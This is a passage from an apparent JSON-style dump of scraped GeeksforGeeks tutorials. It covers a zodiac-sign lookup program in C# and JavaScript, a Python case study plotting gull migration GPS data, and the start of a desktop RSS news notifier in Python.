\"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.WriteLine(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Driver code\u00a0\u00a0\u00a0\u00a0public static void Main ()\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}}\u00a0// This code is contributed by vt_m.Javascript<script>\u00a0// JavaScript program to display astrological sign// or Zodiac sign for given date of birth\u00a0// Function to calculate sum// digits of nfunction zodiac_sign(day, month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0// Driver Code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0let month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0</script>Output:\u00a0\u00a0Taurus\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4d5335cdf2e8375f11cf9105eac2981b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "One fascinating area of research uses GPS to track the movements of animals. It is now possible to manufacture a small GPS device that is solar charged, so you don\u2019t need to change batteries and use it to track flight patterns of birds.\u00a0The data for this case study comes from the LifeWatch INBO project. Several data sets have been released as part of this project. We will use a small data set that consists of migration data for three gulls named Eric, Nico, and Sanne. The official_datasets; used dataset \u2013 CSV\u201d>csv file contains eight columns and includes variables like latitude, longitude, altitude, and time stamps. In this case study, we will first load the data, visualize some simple flight trajectories, track flight speed, learn about daytime, and much, much more.Aim: Track the movement of three gulls namely \u2013 Eric, Nico & SanneDataset: official_datasets; used dataset \u2013 csv\u00a0Dependencies: Matplotlib, Pandas, Numpy, Cartopy, ShapelyRepository(Github): source code\u00a0(check the repository for the documentation of source code.)\u00a0Writeup: explanation(.pdf)We will divide our case study into five parts:\u00a01. Visualizing longitude and latitude data of the gulls.\u00a02. Visualize the variation of the speed of the gulls.\u00a03. Visualize the time required by the gulls to cover equal distances over the journey.\u00a04. Visualize the daily mean speed of the gulls.\u00a05. Cartographic view of the journey of the gulls.PART (1/5): Latitude and Longitude\u00a0In this part, we are going to visualize the location of the birds. We are going to plot latitude and longitude along the y and x-axis respectively and visualize the location data present in the csv file.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport numpy as np\u00a0\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# storing the indices of the bird Ericix = birddata.bird_name == \"Eric\"x,y = birddata.longitude[ix], birddata.latitude[ix]plt.figure(figsize = (7,7))plt.plot(x,y,\"b.\")\u00a0''' To look at all the birds trajectories,\u00a0\u00a0\u00a0\u00a0we plot each bird in the same plot '''plt.figure(figsize = (7,7))for bird_name in bird_names:\u00a0\u00a0\u00a0\u00a0\u00a0# storing the indices of the bird Eric\u00a0\u00a0\u00a0\u00a0ix = birddata.bird_name == bird_name\u00a0\u00a0\u00a0\u00a0\u00a0x,y = birddata.longitude[ix], birddata.latitude[ix]\u00a0\u00a0\u00a0\u00a0plt.plot(x,y,\".\", label=bird_name)plt.xlabel(\"Longitude\")plt.ylabel(\"Latitude\")plt.legend(loc=\"lower right\")plt.show()plt.figure(figsize = (7,7))\nplt.plot(x,y,\"b.\")We use the matplotlib function, figure() to initialize size of the figure as 7 x 7 and plot it using the plot() function.The parameters inside the function plot() i.e x, y and \u201cb.\u201d are specifying to use longitude data along x axis(for x), latitude along y(for y) and b=blue, . = circles in the visualization.\u00a0Output : You must have all the dependencies.Install them using \"pip install dependency_name\"PART (2/5): 2D Speed Vs Frequency\u00a0In this second part of the case study, we are going to visualize 2D speed vs Frequency for the gull named \u201cEric\u201d.Pythonimport pandas as pdimport matplotlib.pyplot as pltimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# storing the indices of the bird Ericix = birddata.bird_name == \"Eric\"speed = birddata.speed_2d[ix]\u00a0plt.figure(figsize = (8,4))ind = np.isnan(speed)plt.hist(speed[~ind], bins = np.linspace(0,30,20), normed=True)plt.xlabel(\" 2D speed (m/s) \")plt.ylabel(\" Frequency \")plt.show()ind = np.isnan(speed)\nplt.hist(speed[~ind], bins = np.linspace(0,30,20), normed=True)\nplt.xlabel(\" 2D speed (m/s) \")\nplt.ylabel(\" Frequency \")\nplt.show()The parameters speed[~ind] indicates that we will include only those entries for which ind != True, bins=np.linspace(0,30,20) indicates the bins along the x-axis will vary from 0 to 30 with 20 bins within them, linearly spaced. Lastly, we plot 2D speed in m/s along the x-axis and Frequency along the y-axis using the xlabel() and ylabel() functions respectively and plot the data using plt.show().Output :\u00a0PART (3/5): Time and Date\u00a0The third part is associated with date and time. We are going to visualize the time(in days) required by Eric to cover constant distances through his journey. If he covers equal distances in an equal amount of time, then the Elapsed time vs Observation curve will be linear.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport datetimeimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0timestamps = []for k in range(len(birddata)):\u00a0\u00a0\u00a0\u00a0timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))\u00a0birddata[\"timestamp\"] = pd.Series(timestamps, index = birddata.index)\u00a0times = birddata.timestamp[birddata.bird_name == \"Eric\"]elapsed_time = [time-times[0] for time in times]\u00a0plt.plot(np.array(elapsed_time)/datetime.timedelta(days=1))plt.xlabel(\" Observation \")plt.ylabel(\" Elapsed time (days) \")plt.show()for k in range(len(birddata)):\n    timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))\u201c>>>datetime.datetime.today()\u201d, returns the current Date (yy-mm-dd) & time (h:m:s).\u00a0\u201c>>>date_str[:-3]\u201d, slices/removes the UTC +00 coordinated time stamps.\u00a0\u201c>>>datetime.datetime.strptime(date_str[:-3], \u201c%Y-%m-%d %H:%M:%S\u201d)\u201d ,the time-stamp strings from date_str are converted to datetime object to be worked upon. \u201c%Y-%m-%d %H:%M:%S\u201d is the Year-Month-Date and Hour-Minute-Second format.Output:\u00a0PART (4/5): Daily Mean Speed\u00a0We are going to visualize the daily mean speed of the gull named \u201cEric\u201d for the total number of days of recorded flight.\u00a0Pythonimport pandas as pdimport matplotlib.pyplot as pltimport datetimeimport numpy as np\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0timestamps = []for k in range(len(birddata)):\u00a0\u00a0\u00a0\u00a0timestamps.append(datetime.datetime.strptime(birddata.date_time.iloc[k][:-3], \"%Y-%m-%d %H:%M:%S\"))birddata[\"timestamp\"] = pd.Series(timestamps, index = birddata.index)\u00a0data =\u00a0 birddata[birddata.bird_name == \"Eric\"]times = data.timestampelapsed_time = [time-times[0] for time in times]elapsed_days = np.array(elapsed_time)/datetime.timedelta(days=1)\u00a0next_day = 1inds = []daily_mean_speed = []for (i,t) in enumerate(elapsed_days):\u00a0\u00a0\u00a0\u00a0if t < next_day:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inds.append(i)\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0daily_mean_speed.append(np.mean(data.speed_2d[inds]))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0next_day += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inds = []\u00a0plt.figure(figsize = (8,6))plt.plot(daily_mean_speed, \"rs-\")plt.xlabel(\" Day \")plt.ylabel(\" Mean Speed (m/s) \");plt.show()enumerate() - is one of the built-in Python functions. It returns an enumerated object. In our case, that object is a list of tuples (immutable lists), each containing a pair of count/index and value.Output:\u00a0PART (5/5): Cartographic View\u00a0In this last part, we are going to track the Birds over a map.\u00a0Pythonimport pandas as pdimport cartopy.crs as ccrsimport cartopy.feature as cfeatureimport matplotlib.pyplot as plt\u00a0birddata = pd.read_csv(\"bird_tracking.csv\")bird_names = pd.unique(birddata.bird_name)\u00a0# To move forward, we need to specify a# specific projection that we're interested# in using.proj = ccrs.Mercator()\u00a0plt.figure(figsize=(10,10))ax = plt.axes(projection=proj)ax.set_extent((-25.0, 20.0, 52.0, 10.0))ax.add_feature(cfeature.LAND)ax.add_feature(cfeature.OCEAN)ax.add_feature(cfeature.COASTLINE)ax.add_feature(cfeature.BORDERS, linestyle=':')for name in bird_names:\u00a0\u00a0\u00a0\u00a0ix = birddata['bird_name'] == name\u00a0\u00a0\u00a0\u00a0x,y = birddata.longitude[ix], birddata.latitude[ix]\u00a0\u00a0\u00a0\u00a0ax.plot(x,y,'.', transform=ccrs.Geodetic(), label=name)plt.legend(loc=\"upper left\")plt.show()import cartopy.crs as ccrs\nimport cartopy.feature as cfeatureThese modules are important for mapping data.ax.add_feature(cfeature.LAND)\nax.add_feature(cfeature.OCEAN)\nax.add_feature(cfeature.COASTLINE)\nax.add_feature(cfeature.BORDERS, linestyle=':')We add the salient physical features of a map.Output:\u00a0Resources :\u00a01. edX \u2013 HarvardX \u2013 Using Python for Research\u00a02. Python functions doc_I\u00a03. Python functions doc_IIThis article is contributed by Amartya Ranjan Saikia. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f693b79eace25d6834b43a60a32611e1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "To get started with the Desktop News Notifier, we require two libraries: feedparser and notify2.\u00a0Give following command to to install feedparser:\u00a0sudo pip3 install feedparserFor installing notify2 in your terminal:sudo pip3 install notify2Feedparser will parse the feed that we will get from the URL. We will use notify2 for the desktop notification purpose. Other than these two libraries, we will use OS and time lib. Once you are done with the installation import both libraries in the program. Here, in this example I have parsed the news from the BBC UK, you can use any news feedparser URL. Let\u2019s have a look at the program:\u00a0\u00a0Python# Python program to illustrate# desktop news notifierimport feedparserimport notify2import osimport timedef parseFeed():\u00a0\u00a0\u00a0\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")\u00a0\u00a0\u00a0\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"\u00a0\u00a0\u00a0\u00a0notify2.init('News Notify')\u00a0\u00a0\u00a0\u00a0for newsitem in f['items']:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0n = 